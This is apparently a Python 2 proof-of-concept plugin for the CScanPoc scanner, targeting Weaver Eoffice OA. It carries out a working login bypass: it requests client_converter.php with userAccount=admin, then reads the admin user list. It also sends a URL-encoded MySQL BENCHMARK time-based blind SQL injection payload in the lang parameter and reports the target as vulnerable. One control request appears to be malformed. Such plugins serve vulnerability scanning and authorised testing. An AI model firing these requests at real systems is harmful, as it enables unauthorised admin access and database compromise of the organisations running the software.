# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'weaver_0013'  # 平台漏洞编号，留空
    name = '泛微Eoffice 后台绕过和时间盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-06'  # 漏洞公布时间
    desc = '''
        泛微Eoffice存在后台绕过和时间盲注漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '140ec2b4-002a-457f-8665-6ddc00c3a02d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0124503
            hh = hackhttp.hackhttp()
            payload1 = '/client_converter.php?userAccount=admin&lang=cn'
            payload2 = '/general/system/user/userlist.php'
            url1 = self.target + payload1
            code1, head1, res1, errcode1, _ = hh.http(url1)
            url2 = self.target + payload2
            code2, head2, res2, errcode2, _ = hh.http(url2)

            if code2 == 200 and 'delete_user(DEPT_ID,USER_ID,USER_NAME)' in res2:
                #security_hole(url1 + "   :Background bypass")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            payload1 = '/client_converter.php?lang=%28SELECT%20%28CASE%20WHEN%20%288939%3D8939%29%20THEN%20%28SELECT%20BENCHMARK%282500000%2CMD5%28123%29%29%29%20ELSE%208939%2a%28SELECT%208939%20FROM%20mysql.db%29%20END%29%29&userAccount=abc'
            payload2 = '/client_converter.php?lang=1userAccount=abc'
            url1 = self.target + payload1
            url2 = self.target + payload2
            t1 = time.time()
            code1, head1, res1, errcode1, _ = hh.http(url1)
            t2 = time.time()
            code2, head2, res2, errcode2, _ = hh.http(url2)
            t3 = time.time()
            if 2*t2 - t1 - t3 > 3:
                #security_hole(url1 + "   :time-based blind")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
